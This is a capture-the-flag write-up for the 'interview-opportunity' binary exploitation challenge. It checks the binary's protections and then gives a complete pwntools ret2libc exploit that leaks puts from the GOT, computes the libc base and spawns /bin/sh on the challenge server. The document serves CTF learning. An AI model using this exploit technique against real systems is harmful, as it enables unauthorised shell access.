# interview-opportunity

---

We are provided with two files.

```
interview-opportunity
libc.so.6
```

---

First we need to check the protections of the binary in order to determine which
vulnerabilities the binary has.

```fish
$ checksec --file=interview-opportunity

RELRO           STACK CANARY      NX            PIE   
Partial RELRO   No canary found   NX enabled    No PIE
```
The binary doesn't has stack canary, so it can be vulnerable to buffer overflow.
Since we are provided with a libc file, it is probable that the vulnerability is
a ret2libc exploit.

---

```py
from pwn import *

e = ELF('./interview-opportunity')
libc = ELF('./libc.so.6')

context.binary = e
context.arch = 'amd64'
context.terminal = 'kitty'

# p = process('./interview-opportunity', env={'LD_PRELOAD':'libc.s0.6'})

# p = gdb.debug("./interview-opportunity", env={'LD_PRELOAD':'libc.so.6'}, gdbscript='''
#         b *main
#         continue
# ''')

p = remote('mc.ax', 31081)

gadget = 0x401313
main = e.symbols['main']
puts = e.symbols['puts']
puts_got = e.got['puts']
puts_off = libc.symbols['puts']
binsh_off = next(libc.search(b'/bin/sh'))

log.info('Puts got adr: ' + hex(puts_got))
log.info('Puts libc off: ' + hex(puts_off))
log.info('Binsh libc off: ' + hex(binsh_off))

payload = b"a" * 34
payload += p64(main)

p.sendlineafter("So tell us. Why should you join DiceGang?", payload)

payload = b"a" * 34
payload += p64(gadget)
payload += p64(puts_got)
payload += p64(puts)
payload += p64(main)

p.sendlineafter("So tell us. Why should you join DiceGang?", payload)

p.recvline()
p.recvline()
p.recvline()

libc_off = u64(p.recvline(keepends = False).ljust(8, b'\x00')) - puts_off

log.info('Libc base adr: ' + hex(libc_off))
log.info('System adr: ' + hex(libc_off + libc.symbols["system"]))
log.info('Binsh adr: ' + hex(libc_off + binsh_off))

payload = b"a" * 34
payload += p64(gadget)
payload += p64(libc_off + binsh_off)
payload += p64(libc_off + libc.symbols["system"])

p.sendlineafter("So tell us. Why should you join DiceGang?", payload)

p.interactive()
```
